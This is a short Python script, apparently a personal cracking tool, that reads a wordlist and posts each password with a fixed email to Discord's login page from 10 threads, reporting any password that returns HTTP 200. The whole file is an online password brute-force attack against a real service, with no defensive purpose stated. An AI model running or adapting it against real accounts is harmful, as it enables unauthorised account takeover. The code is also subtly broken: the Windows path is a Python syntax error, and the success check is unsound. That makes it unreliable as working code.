import requests
from concurrent.futures import ThreadPoolExecutor

def check_password(password):
    url = 'https://discord.com/login'
    response = requests.post(url, data={"email": "youremail@test.com", "password": password})
    if response.status_code == 200:
        print(f"Password found: {password}")
        return password

def main():
    with open("C:\Users\Utilisateur\Desktop\PyCrackV2\~dico.txt", "r") as f:
        passwords = [line.strip() for line in f]

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(check_password, password) for password in passwords]

        for future in futures:
            future.result()

if __name__ == "__main__":
    main()